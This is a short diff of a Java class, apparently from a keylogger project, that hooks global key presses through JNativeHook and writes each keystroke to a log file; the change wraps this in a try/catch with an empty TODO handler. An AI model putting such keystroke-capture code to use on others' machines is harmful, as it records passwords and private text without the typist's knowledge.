@@ -14,21 +14,25 @@ public class KeyListener implements NativeKeyListener, AutoCloseable {
 
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
-		if (isAction(keyEvent.getKeyCode())) {
-			String actionAsString = ("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
-			fileManager.log(actionAsString.toUpperCase());
-		}
-		if (isLetter(keyEvent.getKeyCode())) {
-			fileManager.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
-			System.out.println(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
-		}
-		switch (keyEvent.getKeyCode()) {
-		case NativeKeyEvent.VC_MINUS:
-			fileManager.log("-");
-			break;
-		case NativeKeyEvent.VC_UNDERSCORE:
-			fileManager.log("_");
-			break;
+		try {
+			if (isAction(keyEvent.getKeyCode())) {
+				String actionAsString = ("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
+				fileManager.log(actionAsString.toUpperCase());
+			}
+			if (isLetter(keyEvent.getKeyCode())) {
+				fileManager.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
+				System.out.println(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
+			}
+			switch (keyEvent.getKeyCode()) {
+			case NativeKeyEvent.VC_MINUS:
+				fileManager.log("-");
+				break;
+			case NativeKeyEvent.VC_UNDERSCORE:
+				fileManager.log("_");
+				break;
+			}
+		} catch (IOException exception) {
+			//TODO
 		}
 	}
 
